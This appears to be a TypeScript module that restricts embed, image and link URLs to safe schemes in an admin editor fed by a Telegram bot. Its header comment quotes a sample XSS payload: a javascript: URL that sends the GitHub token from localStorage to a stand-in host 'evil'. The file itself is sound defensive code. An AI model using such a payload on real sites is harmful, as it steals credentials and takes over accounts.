// Restrict URLs that become an iframe/img `src` to safe schemes.
//
// Why this matters: the Telegram bot commits whatever an allowlisted user sends
// as a draft, raw HTML included. A crafted draft like
//   <div data-embed data-src="javascript:fetch('//evil/?t='+localStorage['lanza:token'])">
// would, when opened in Lanza, render <iframe src="javascript:…"> that executes
// in the admin origin and exfiltrates the GitHub token. Blocking non-http(s)
// schemes here closes that, and keeps junk schemes out of the committed/public HTML.

function isLocalPath(url: string): boolean {
  return url.startsWith("/") || url.startsWith("./") || url.startsWith("../");
}

function httpOnly(url: string): string {
  try {
    const u = new URL(url);
    return u.protocol === "https:" || u.protocol === "http:" ? url : "";
  } catch {
    return "";
  }
}

/** Absolute http(s) URL, else "". Embeds require an absolute URL. */
export function safeEmbedUrl(raw: string | null | undefined): string {
  const url = (raw ?? "").trim();
  return url ? httpOnly(url) : "";
}

/** http(s) or a local/relative path (e.g. /images/uploads/…), else "". */
export function safeImageUrl(raw: string | null | undefined): string {
  const url = (raw ?? "").trim();
  if (!url) return "";
  return isLocalPath(url) ? url : httpOnly(url);
}

// Schemes a link `href` may use. Anything else (notably `javascript:`/`data:`)
// is rejected so a crafted link can't execute in the admin origin or land in
// the committed/public HTML.
const LINK_SCHEMES = new Set(["http:", "https:", "mailto:", "tel:"]);

/**
 * Validate a link `href`: an allow-listed absolute scheme, or a local/relative
 * path (`/about`, `#anchor`, `./x`). Returns the trimmed URL, else "". Used both
 * to gate the manual "add link" prompt and as TipTap Link's `validate` callback
 * (so pasted/loaded links are filtered too), keeping link policy in one place.
 */
export function safeLinkUrl(raw: string | null | undefined): string {
  const url = (raw ?? "").trim();
  if (!url) return "";
  if (isLocalPath(url) || url.startsWith("#")) return url;
  try {
    return LINK_SCHEMES.has(new URL(url).protocol) ? url : "";
  } catch {
    return "";
  }
}
